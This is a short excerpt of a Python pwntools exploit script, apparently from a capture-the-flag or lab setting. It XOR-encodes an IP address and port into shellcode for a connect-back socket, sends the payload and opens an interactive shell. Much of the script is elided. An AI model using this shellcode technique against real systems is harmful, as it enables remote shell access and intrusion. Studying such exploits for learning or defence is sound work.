...
# If running locally, ensure that you have a server.ini file with all the needed fields or it will immediately end
context.arch = "amd64"
...
# Take a long IP and make it work :)
if int(hex_ip_and_port,16) < 0:
    value1 = int(shellcode.split('^')[0].split(' ')[-2].strip(), 16)
    packed_socket_adress = p64((value1 ^ int(hex_ip_and_port,16)) & ((1 << 64) - 1) ^ value1)
    print((value1 ^ int(hex_ip_and_port,16)) & ((1 << 64) - 1) ^ value1)
...
p.sendline(post)
p.interactive() #include this to suck up rest of IO, no interactive = no shell (unless in GDB)